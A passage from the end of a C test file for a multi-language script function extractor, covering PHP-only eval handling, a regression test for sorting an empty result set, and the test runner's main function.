 * same as it was before this feature existed anywhere. */
static void eval_island_is_php_only(void)
{
	static const char js[] = "eval('function foo(){ return 1; }');\n";
	struct kgenome_func_set fs;

	memset(&fs, 0, sizeof fs);
	kgenome_script_funcs_build(KGENOME_TEXTUAL_LANG_JS, (const uint8_t *)js, sizeof js - 1u, &fs);
	CK(fs.n == 0u);
	CK(fs.partial == 0u);
	bounds_ok(&fs, sizeof js - 1u);
	kgenome_funcs_free(&fs);
}

/*
 * SCRIPTFUNCS-QSORT-1's reproducer, over every brace-delimited language this builder shares one
 * code path for: a text with zero function-like constructs leaves `l.v` NULL (nothing matched),
 * and the dedup qsort at the end of kgenome_script_funcs_build ran unconditionally over it - a
 * NULL base is UB per the standard even at count 0 (harmless under glibc, real under ASAN/UBSAN;
 * see tests/lib/genome/script_funcs.c's eval_literal_with_no_function_merges_cleanly, which hit
 * this by accident in PHP alone). Checked here per language so the fix is not re-broken for one
 * of the other four by a future change that only re-tests PHP.
 */
static void zero_functions_found_every_language(void)
{
	static const struct { uint32_t lang; const char *src; size_t n; } cases[] = {
		{ KGENOME_TEXTUAL_LANG_PHP,  "<?php\necho 1;\n",      0 },
		{ KGENOME_TEXTUAL_LANG_JS,   "var x = 1;\n",          0 },
		{ KGENOME_TEXTUAL_LANG_PERL, "my $x = 1;\n",          0 },
		{ KGENOME_TEXTUAL_LANG_PSH,  "$x = 1\n",              0 },
		{ KGENOME_TEXTUAL_LANG_SH,   "x=1\necho $x\n",        0 },
	};
	unsigned i;

	for (i = 0; i < sizeof cases / sizeof cases[0]; i++) {
		struct kgenome_func_set fs;
		size_t n = cases[i].n ? cases[i].n : strlen(cases[i].src);

		memset(&fs, 0, sizeof fs);
		kgenome_script_funcs_build(cases[i].lang, (const uint8_t *)cases[i].src, n, &fs);
		CK(fs.n == 0u);
		bounds_ok(&fs, n);
		kgenome_funcs_free(&fs);
	}
}

int main(int argc, char **argv)
{
	hk_args(argc, argv);
	several_named_functions();
	by_reference_return_skips_the_ampersand();
	anonymous_closure_has_no_name();
	hostile_name_starting_with_a_digit();
	truncated_function_keeps_its_name();
	nesting_keeps_the_outer_name();
	zeroed_entry_has_no_name();
	js_several_named_functions();
	js_function_expression_has_no_name();
	js_keyword_in_a_string_is_not_a_function();
	js_truncated_function_keeps_its_name();
	perl_several_named_functions();
	perl_anonymous_sub_has_no_name();
	perl_forward_declaration_is_not_a_function();
	perl_truncated_function_keeps_its_name();
	psh_several_named_functions();
	psh_keyword_in_a_comment_is_not_a_function();
	psh_truncated_function_keeps_its_name();
	sh_both_shapes_in_one_file();
	sh_a_call_is_not_mistaken_for_a_declaration();
	sh_non_empty_parens_is_not_a_declaration();
	sh_keyword_in_a_string_is_not_a_function();
	sh_truncated_function_keeps_its_name();
	eval_literal_function_is_found_and_flagged();
	eval_literal_with_no_function_merges_cleanly();
	eval_literal_unbalanced_braces_is_not_merged();
	eval_of_a_variable_is_not_an_island();
	eval_of_a_decode_call_is_not_an_island();
	eval_of_a_concatenation_is_not_an_island();
	eval_of_two_arguments_is_not_an_island();
	eval_of_an_escaped_literal_is_not_an_island();
	eval_of_a_double_quoted_literal_is_not_an_island();
	eval_literal_nested_three_levels_finds_the_innermost_function();
	eval_literal_depth_cap_is_reported_not_silent();
	eval_island_is_php_only();
	zero_functions_found_every_language();
	printf("script_funcs: %d failure(s)\n", hk_fails);
	return hk_fails != 0;
}
